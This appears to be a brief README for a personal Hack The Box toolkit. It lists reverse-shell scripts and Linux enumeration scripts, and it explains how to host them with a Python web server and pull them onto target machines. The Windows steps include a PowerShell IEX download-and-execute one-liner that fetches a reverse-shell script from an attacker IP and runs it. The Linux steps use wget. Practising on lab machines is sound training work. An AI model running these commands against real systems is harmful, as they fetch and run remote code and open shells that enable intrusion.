# Hackthebox tools
**shell.php and shell.ps1** : Use for reverse shell when uploaded to vuln machine

**les.sh and LinEnum.sh** : Use for detect vuln in Linux machine

### How to upload files to vuln linux machine
In your machine type : 
> python -m SimpleHTTPServer

In vuln machine type : 
> wget (your ip address):8000/(file to upload)

Example : 
> wget 10.10.14.62:8000/les.sh

### How to execute powershell script to vuln windows machine
In your machine type : 
> python -m SimpleHTTPServer

In vuln machine type : 
```
if in powershell
IEX(New-Object Net.WebClient).downloadString('http://<ip address>:8000/<file>')
or if in cmd
powershell IEX(New-Object Net.WebClient).downloadString('http://<ip address>:8000/<file>')
```
  
Example : 
> powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.12.81:8000/shell.ps1')
